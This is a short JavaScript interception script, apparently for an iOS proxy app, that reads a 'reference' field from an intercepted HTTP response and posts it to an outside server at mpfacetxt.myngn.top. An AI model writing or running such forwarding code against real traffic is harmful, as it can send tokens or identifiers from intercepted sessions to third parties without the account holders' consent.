let body = $response.body;
let obj = JSON.parse(body);

if (obj.reference) {
    fetch("https://mpfacetxt.myngn.top/get_ref.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ "reference": obj.reference })
    })
    .then(response => response.json())
    .then(data => $notify("Reference Status", "", data.status === "success" ? "Reference sent successfully!" : "Failed to send reference: " + data.message))
    .catch(error => $notify("Reference Failed", "", "An error occurred: " + error.message));
}

$done({body});
